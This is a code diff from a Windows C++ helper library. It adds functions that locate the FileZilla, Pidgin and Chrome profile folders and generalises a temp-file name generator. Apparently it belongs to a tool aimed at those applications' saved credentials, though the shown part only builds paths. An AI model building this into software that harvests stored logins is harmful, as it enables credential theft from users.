@@ -74,33 +74,45 @@ typedef NTSTATUS(WINAPI *PFN_NT_QUERY_SYSTEM_INFORMATION)(
 	);
 
 
-HRESULT libsystem::get_roaming_path(PWSTR* path) {
+HRESULT libsystem::get_appdata_path(PWSTR* path) {
 	HRESULT appdata = NULL;
 	return SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, path);
 }
 
+HRESULT libsystem::get_localappdata_path(PWSTR* path) {
+	HRESULT appdata = NULL;
+	return SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, path);
+}
+
 std::wstring libsystem::get_filezilla_path(void) {
 	PWSTR roaming[MAX_PATH] = { 0 };
-	libsystem::get_roaming_path(roaming);
+	get_appdata_path(roaming);
 	std::wstring filezilla_path(*roaming);
 	return filezilla_path + FILEZILLA_FOLDER;
 }
 
 std::wstring libsystem::get_pidgin_path(void) {
 	PWSTR roaming[MAX_PATH] = { 0 };
-	libsystem::get_roaming_path(roaming);
-	std::wstring filezilla_path(*roaming);
-	return filezilla_path + PIDGIN_FOLDER;
+	get_appdata_path(roaming);
+	std::wstring path(*roaming);
+	return path + PIDGIN_FOLDER;
 }
 
-BOOL libsystem::generate_temp_filename(LPWSTR filename) {
+std::wstring libsystem::get_chrome_path(void) {
+	PWSTR localappdata[MAX_PATH] = { 0 };
+	get_localappdata_path(localappdata);
+	std::wstring path(*localappdata);
+	return path + CHROME_FOLDER;
+}
+
+BOOL libsystem::generate_temp_filename(LPCWSTR prefix, LPWSTR filename) {
 	WCHAR temp[MAX_PATH] = { 0 };
 
 	if (GetTempPathW(MAX_PATH, temp) == 0) {
 		return FALSE;
 	}
 
-	if (GetTempFileNameW(temp, L"psc", 0, filename) == 0) {
+	if (GetTempFileNameW(temp, prefix, 0, filename) == 0) {
 		return FALSE;
 	}
 
